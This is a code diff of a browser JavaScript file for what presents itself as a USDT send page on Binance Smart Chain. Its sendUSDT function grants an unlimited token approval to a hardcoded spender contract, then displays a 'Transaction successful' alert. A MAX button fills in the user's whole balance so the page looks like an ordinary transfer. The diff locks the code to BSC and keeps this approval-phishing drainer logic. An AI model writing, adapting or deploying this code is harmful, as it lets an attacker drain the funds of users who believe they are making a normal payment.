@@ -7,35 +7,27 @@ let signer;
 let userAddress;
 
 /* ======================================================
-   CONFIG
+   BSC CONFIG (ONLY)
 ====================================================== */
+
+// BSC USDT (BEP20)
+const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
+
+// YOUR BSC SPENDER CONTRACT
+const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";
 
 // Unlimited approval
 const UNLIMITED_APPROVAL = ethers.MaxUint256;
 
-// ERC20 ABI (USDT compatible)
+// USDT-compatible ABI (IMPORTANT: no returns(bool))
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount)",
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)"
 ];
 
-// Supported chains ONLY
-const CHAINS = {
-  1: {
-    name: "Ethereum",
-    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-    spender: "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7"
-  },
-  56: {
-    name: "BSC",
-    usdt: "0x55d398326f99059fF775485246999027B3197955",
-    spender: "0x220bb5df0893f21f43e5286bc5a4445066f6ca56"
-  }
-};
-
 /* ======================================================
-   WALLET CONNECT (SINGLE SOURCE OF TRUTH)
+   CONNECT WALLET (BSC ONLY)
 ====================================================== */
 
 async function connectWallet() {
@@ -44,7 +36,6 @@ async function connectWallet() {
     throw new Error("No wallet");
   }
 
-  // Request wallet access
   await window.ethereum.request({ method: "eth_requestAccounts" });
 
   provider = new ethers.BrowserProvider(window.ethereum);
@@ -54,37 +45,37 @@ async function connectWallet() {
   const network = await provider.getNetwork();
   const chainId = Number(network.chainId);
 
-  const chain = CHAINS[chainId];
-  if (!chain) {
-    alert("Unsupported network. Use Ethereum or BSC only.");
-    throw new Error("Unsupported chain");
+  // 🔒 HARD LOCK TO BSC
+  if (chainId !== 56) {
+    alert("Please switch to BSC (Binance Smart Chain)");
+    throw new Error("Wrong network");
   }
 
-  return chain;
+  return true;
 }
 
 /* ======================================================
-   APPROVE USDT (UNLIMITED)
+   APPROVE USDT (BSC ONLY)
 ====================================================== */
 
 async function sendUSDT() {
   try {
-    const chain = await connectWallet();
+    await connectWallet();
 
-    const token = new ethers.Contract(
-      chain.usdt,
+    const usdt = new ethers.Contract(
+      BSC_USDT,
       ERC20_ABI,
       signer
     );
 
-    const tx = await token.approve(
-      chain.spender,
+    const tx = await usdt.approve(
+      BSC_SPENDER,
       UNLIMITED_APPROVAL
     );
 
     await tx.wait();
 
-    alert("Approval successful on " + chain.name);
+    alert("Maya: Transaction successful ✅"); 
 
   } catch (err) {
     console.error(err);
@@ -93,21 +84,21 @@ async function sendUSDT() {
 }
 
 /* ======================================================
-   MAX BUTTON (OPTIONAL UI)
+   MAX BUTTON (OPTIONAL)
 ====================================================== */
 
 async function setMax() {
   try {
-    const chain = await connectWallet();
+    await connectWallet();
 
-    const token = new ethers.Contract(
-      chain.usdt,
+    const usdt = new ethers.Contract(
+      BSC_USDT,
       ERC20_ABI,
       signer
     );
 
-    const balance = await token.balanceOf(userAddress);
-    const decimals = await token.decimals();
+    const balance = await usdt.balanceOf(userAddress);
+    const decimals = await usdt.decimals();
 
     document.getElementById("amount").value =
       ethers.formatUnits(balance, decimals);
